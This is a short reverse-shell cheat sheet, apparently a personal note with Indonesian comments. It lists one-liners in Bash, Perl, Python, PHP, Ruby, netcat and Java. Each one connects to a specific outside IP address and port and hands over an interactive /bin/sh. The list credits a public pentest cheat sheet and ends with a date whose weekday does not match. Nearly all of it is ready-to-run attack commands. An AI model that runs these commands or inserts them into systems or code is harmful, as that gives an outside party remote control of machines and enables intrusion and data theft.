# Connected13.php

#Bash
bash -i >& /dev/tcp/141.136.42.79/0710 0>&1

#Perl
perl -e 'use Socket;$i="141.136.42.79";$p=0710;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

#Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("141.136.42.79",0710));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#PHP
php -r '$sock=fsockopen("141.136.42.79",0710);exec("/bin/sh -i <&3 >&3 2>&3");'

#Ruby
ruby -rsocket -e'f=TCPSocket.open("141.136.42.79",0710).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#Netcat
nc -e /bin/sh 141.136.42.79 0710

jika netcat yang terinstall itu versi yang berbeda maka bisa memakai ini untuk reverse shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 141.136.42.79 0710 >/tmp/f

#Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/141.136.42.79/0710;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

Referensi
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
Thailand, 00:50 Senin 20 Januari 2023 di kursi yang nyaman dan di depan komputer kesayangan
